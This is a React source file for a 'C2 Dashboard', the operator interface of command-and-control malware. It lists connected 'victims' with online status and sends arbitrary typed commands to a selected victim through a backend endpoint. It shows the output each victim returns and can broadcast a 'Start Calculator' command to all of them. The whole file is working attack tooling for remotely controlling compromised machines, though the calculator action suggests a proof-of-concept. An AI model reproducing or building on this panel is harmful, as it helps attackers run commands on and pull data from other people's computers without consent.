import React, { useEffect, useState } from "react";

export default function Dashboard() {
  const [victims, setVictims] = useState({});
  const [outputLog, setOutputLog] = useState([]);
  const [selectedVictim, setSelectedVictim] = useState("");
  const [command, setCommand] = useState("");
  const [showLog, setShowLog] = useState(false);
  const [victimOutputs, setVictimOutputs] = useState({});
  const API_BASE = "http://localhost:8000";

  const now = Date.now() / 1000;

  useEffect(() => {
    const fetchData = () => {
      fetch(`${API_BASE}/api/dashboard`)
        .then((res) => res.json())
        .then((data) => {
          setVictims(data.victims || {});
          const outputsByVictim = {};
          (data.output_log || []).forEach(({ victim_id, output }) => {
            if (!outputsByVictim[victim_id]) outputsByVictim[victim_id] = "";
            outputsByVictim[victim_id] += output + "\n";
          });
          setVictimOutputs(outputsByVictim);
          setOutputLog(data.output_log || []);
        })
        .catch((err) => console.error("Fetch error:", err));
    };
    fetchData();
    const interval = setInterval(fetchData, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleSendCommand = (e) => {
    e.preventDefault();
    if (!selectedVictim || !command) return;
    fetch(`${API_BASE}/send_command`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victim_id: selectedVictim, command }),
    }).then(() => setCommand(""));
  };

  const clearVictimData = () => {
    fetch(`${API_BASE}/api/clear`, { method: "POST" }).then(() => {
      setVictims({});
      setOutputLog([]);
      setSelectedVictim("");
    });
  };

  const handleBroadcastCalc = () => {
    fetch(`${API_BASE}/send-calc`, { method: "POST" });
  };

  return (
    <div style={styles.container}>
      {/* Sidebar */}
      <div style={styles.sidebar}>
        <div style={styles.sidebarHeader}>
          <h1 style={styles.title}>C2 Dashboard</h1>
          <p style={styles.subText}>
            {Object.keys(victims).length} active • {new Date().toLocaleTimeString()}
          </p>
        </div>

        <div style={styles.victimList}>
          {Object.entries(victims).map(([identity, data]) => {
            const lastSeenAgo = now - data.last_seen;
            const isOnline = lastSeenAgo < 15;
            return (
              <div
                key={data.id}
                onClick={() => setSelectedVictim(data.id)}
                style={{
                  ...styles.victimItem,
                  ...(selectedVictim === data.id ? styles.victimItemActive : {}),
                }}
              >
                <span>{identity}</span>
                <span
                  style={{
                    ...styles.statusDot,
                    backgroundColor: isOnline ? colors.green : colors.red,
                  }}
                ></span>
              </div>
            );
          })}
          {Object.keys(victims).length === 0 && (
            <p style={styles.emptyState}>No targets connected</p>
          )}
        </div>

        {/* Quick Actions */}
        <div style={styles.quickActions}>

          <select
            style={styles.commandSelect}
            defaultValue=""
            onChange={(e) => {
              const val = e.target.value;
              if (val === "startCalc") handleBroadcastCalc();
              // add more commands here
              e.target.value = ""; // reset back to Quick Commands  
            }}
          >
            <option value="" disabled>
              Quick Commands
            </option>
            <option value="startCalc">Start Calculator (All)</option>
            {/* add more options here */}
          </select>

          <button onClick={clearVictimData} style={styles.secondaryButton}>
            Clear All Data
          </button>
        </div>
      </div>

      {/* Main Panel */}
      <div style={styles.main}>
        {/* Top Bar */}
        <div style={styles.topBar}>
          <h2 style={styles.topBarTitle}>
            {selectedVictim || "No victim selected"}
          </h2>
          <div>
            <button
              onClick={() => setShowLog(false)}
              style={{
                ...styles.toggleButton,
                ...(showLog ? {} : styles.toggleButtonActive),
              }}
            >
              Output
            </button>
            <button
              onClick={() => setShowLog(true)}
              style={{
                ...styles.toggleButton,
                ...(showLog ? styles.toggleButtonActive : {}),
              }}
            >
              Logs ({outputLog.length})
            </button>
          </div>
        </div>

        {/* Output / Logs */}
        <div style={styles.outputArea}>
          {!showLog ? (
            <pre style={styles.outputText}>
              {selectedVictim && victimOutputs[selectedVictim]
                ? victimOutputs[selectedVictim]
                : "No output for selected victim."}
            </pre>
          ) : (
            <div style={styles.logContainer}>
              {outputLog.length > 0 ? (
                outputLog
                  .slice(-20)
                  .reverse()
                  .map((log, idx) => (
                    <div key={idx} style={styles.logEntry}>
                      <div style={styles.logHeader}>
                        <code style={styles.logId}>{log.victim_id}</code>
                        <span style={styles.logTime}>{log.timestamp}</span>
                      </div>
                      <pre style={styles.logOutput}>{log.output}</pre>
                    </div>
                  ))
              ) : (
                <p style={styles.emptyState}>No activity logged</p>
              )}
            </div>
          )}
        </div>

        {/* Command Input */}
        <form style={styles.commandBar} onSubmit={handleSendCommand}>
          <input
            type="text"
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            placeholder="Enter command..."
            style={styles.commandInput}
          />
          <button
            type="submit"
            style={{
              ...styles.primaryButton,
              ...(selectedVictim && command ? {} : styles.disabledButton),
            }}
            disabled={!selectedVictim || !command}
          >
            Send
          </button>
        </form>
      </div>
    </div>
  );
}

const colors = {
  base: "#1e1e2e",
  mantle: "#181825",
  surface0: "#313244",
  surface1: "#45475a",
  surface2: "#585b70",
  overlay0: "#6c7086",
  overlay1: "#7f849c",
  overlay2: "#9399b2",
  subtext0: "#a6adc8",
  subtext1: "#bac2de",
  text: "#cdd6f4",
  lavender: "#b4befe",
  blue: "#89b4fa",
  sapphire: "#74c7ec",
  sky: "#89dceb",
  teal: "#94e2d5",
  green: "#a6e3a1",
  yellow: "#f9e2af",
  peach: "#fab387",
  maroon: "#eba0ac",
  red: "#f38ba8",
  mauve: "#cba6f7",
  pink: "#f5c2e7",
  flamingo: "#f2cdcd",
  rosewater: "#f5e0dc",
};

const styles = {
  container: {
    display: "grid",
    gridTemplateColumns: "260px 1fr",
    height: "100vh",
    backgroundColor: colors.base,
    color: colors.text,
    fontFamily: "'Inter', sans-serif",
  },
  commandSelect: {
    backgroundColor: colors.surface1,
    color: colors.text,
    border: `1px solid ${colors.surface2}`,
    borderRadius: "6px",
    padding: "8px",
    fontSize: "13px",
    fontFamily: "inherit",
    cursor: "pointer",
  },
  sidebar: {
    display: "flex",
    flexDirection: "column",
    borderRight: `1px solid ${colors.surface1}`,
    backgroundColor: colors.mantle,
  },
  sidebarHeader: {
    padding: "16px",
    borderBottom: `1px solid ${colors.surface1}`,
  },
  title: {
    fontSize: "16px",
    fontWeight: "600",
    marginBottom: "4px",
  },
  subText: {
    fontSize: "12px",
    color: colors.subtext1,
  },
  victimList: {
    flex: 1,
    overflowY: "auto",
  },
  victimItem: {
    display: "flex",
    justifyContent: "space-between",
    padding: "10px 14px",
    cursor: "pointer",
    borderBottom: `1px solid ${colors.surface1}`,
    color: colors.subtext0,
  },
  victimItemActive: {
    backgroundColor: colors.surface0,
    color: colors.text,
  },
  statusDot: {
    height: "10px",
    width: "10px",
    borderRadius: "50%",
  },
  emptyState: {
    padding: "16px",
    color: colors.overlay1,
    fontSize: "13px",
  },
  quickActions: {
    padding: "12px",
    borderTop: `1px solid ${colors.surface1}`,
    display: "flex",
    flexDirection: "column",
    gap: "8px",
  },
  primaryButton: {
    backgroundColor: colors.blue,
    color: colors.base,
    border: "none",
    borderRadius: "6px",
    padding: "8px",
    fontSize: "13px",
    fontWeight: "500",
    cursor: "pointer",
  },
  secondaryButton: {
    backgroundColor: colors.surface1,
    color: colors.text,
    border: `1px solid ${colors.surface2}`,
    borderRadius: "6px",
    padding: "8px",
    fontSize: "13px",
    cursor: "pointer",
  },
  disabledButton: {
    opacity: 0.6,
    cursor: "not-allowed",
  },
  main: {
    display: "flex",
    flexDirection: "column",
    height: "100%",
  },
  topBar: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "12px 16px",
    borderBottom: `1px solid ${colors.surface1}`,
    backgroundColor: colors.surface0,
  },
  topBarTitle: {
    fontSize: "15px",
    fontWeight: "600",
  },
  toggleButton: {
    backgroundColor: colors.surface1,
    color: colors.subtext1,
    border: "none",
    padding: "6px 10px",
    borderRadius: "4px",
    cursor: "pointer",
    marginLeft: "6px",
  },
  toggleButtonActive: {
    backgroundColor: colors.blue,
    color: colors.base,
  },
  outputArea: {
    flex: 1,
    overflowY: "auto",
    backgroundColor: colors.mantle,
    padding: "16px",
  },
  outputText: {
    backgroundColor: colors.surface0,
    border: `1px solid ${colors.surface1}`,
    borderRadius: "6px",
    padding: "10px",
    fontFamily: "'JetBrains Mono', monospace",
    fontSize: "12px",
    color: colors.green,
    whiteSpace: "pre-wrap",
  },
  logContainer: {
    maxHeight: "100%",
    overflowY: "auto",
  },
  logEntry: {
    marginBottom: "14px",
  },
  logHeader: {
    display: "flex",
    justifyContent: "space-between",
    fontSize: "11px",
    color: colors.subtext1,
    marginBottom: "4px",
  },
  logId: {
    color: colors.lavender,
  },
  logTime: {
    fontStyle: "italic",
  },
  logOutput: {
    backgroundColor: colors.surface0,
    borderRadius: "4px",
    padding: "8px",
    fontFamily: "'JetBrains Mono', monospace",
    fontSize: "12px",
    color: colors.text,
    whiteSpace: "pre-wrap",
  },
  commandBar: {
    display: "flex",
    gap: "8px",
    padding: "10px",
    borderTop: `1px solid ${colors.surface1}`,
    backgroundColor: colors.surface0,
  },
  commandInput: {
    flex: 1,
    backgroundColor: colors.surface1,
    border: `1px solid ${colors.surface2}`,
    color: colors.text,
    padding: "8px",
    borderRadius: "6px",
    fontSize: "13px",
    fontFamily: "inherit",
  },
};
